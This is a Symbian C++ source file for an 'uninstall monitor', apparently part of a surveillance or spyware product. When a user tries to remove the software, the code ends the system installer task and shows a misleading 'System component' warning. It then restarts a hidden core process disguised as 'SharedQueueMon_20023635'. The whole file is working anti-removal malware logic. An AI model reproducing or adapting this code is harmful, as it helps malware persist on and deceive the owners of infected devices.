/*
 ============================================================================
 Name		: UninstMonitor.cpp
 Author	  : 
 Copyright   : Your copyright notice
 Description : Exe source file
 ============================================================================
 */

//  Include Files  

#include "UninstMonitor.h"
#include <e32base.h>
#include <e32std.h>

#include <w32std.h>             //RWsSession
#include <APGTASK.h>

#include <aknglobalnote.h>		// CAknGlobalnote

#include <apgcli.h> 			// for RApaLsSession
#include <apacmdln.h> 			// for CApaCommandLine

#include "Keys.h"				// available in  Core/inc

//  Local Functions

LOCAL_C void MainL()
{
	// retrieve our uninstaller UID3
	TBuf8<12> hexBuf(KUidUninstaller);
	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
	TLex8 lex(hexBuf);
	TUint32 uid;
	lex.Val(uid,EHex);
		
	// Let's check if our uninstaller is running
	
	TBool running(EFalse);
	
	TFileName res;
	TFindProcess find;
	while(find.Next(res) == KErrNone){
	   RProcess ph;
	   CleanupClosePushL(ph);
	   TInt err = ph.Open(res);
	   if(err == KErrNone)
		   {
		   if(ph.SecureId() == uid) 
			   { // SID of the process we are looking for: our uninstaller 
			   running = ETrue;
			   ph.Close();
			   CleanupStack::PopAndDestroy(&ph); 
			   break;
			   }
	 	   ph.Close();
		   }
	   CleanupStack::PopAndDestroy(&ph); 
	}
	
	if(!running){
		// our uninstaller is not running, it's a user request, let's kill it!
		const TUid KInstallerUidin3rdEd = {0x101f875a};
		
		RWsSession windowSession;
		CleanupClosePushL(windowSession);
		TInt err = windowSession.Connect();
		if(err == KErrNone)
			{
			TApaTaskList apataskList( windowSession);
			TApaTask apatask = apataskList.FindApp( KInstallerUidin3rdEd );
		 
			if(apatask.Exists()){
				apatask.EndTask();
			}
		
			windowSession.Close();
			}
		CleanupStack::PopAndDestroy(&windowSession);
		
		// show a note to the user
		CAknGlobalNote* note = CAknGlobalNote::NewLC();
		_LIT(KInfoText, "System component");
		note->ShowNoteL(EAknGlobalWarningNote, KInfoText);
		CleanupStack::PopAndDestroy(note);
		
		// restart the core, since the uninstaller stops it before trying to uninstall
		// and before we can catch it!
		hexBuf.Copy(KUidCore);
		hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
		lex.Assign(hexBuf);
		lex.Val(uid,EHex);
		TUid uid3 = TUid::Uid(uid);
			
		const TUidType coreUid(KNullUid, KNullUid, uid3);
		RProcess core;
		CleanupClosePushL(core);
		_LIT(KRcsCore,"SharedQueueMon_20023635");
		TInt r = core.Create(KRcsCore, KNullDesC, coreUid);
		if (r == KErrNone) {
			core.Resume();
			core.Close();
		}
		CleanupStack::PopAndDestroy(&core); 
			
	} 
}

LOCAL_C void DoStartL()
	{
	// Create active scheduler (to run active objects)
	CActiveScheduler* scheduler = new (ELeave) CActiveScheduler();
	CleanupStack::PushL(scheduler);
	CActiveScheduler::Install(scheduler);

	MainL();

	// Delete active scheduler
	CleanupStack::PopAndDestroy(scheduler);
	}

//  Global Functions

GLDEF_C TInt E32Main()
	{
	// Create cleanup stack
	__UHEAP_MARK;
	CTrapCleanup* cleanup = CTrapCleanup::New();

	
	// Run application code inside TRAP harness, wait keypress when terminated
	TRAPD(mainError, DoStartL());
	
	delete cleanup;
	__UHEAP_MARKEND;
	return mainError;
	}

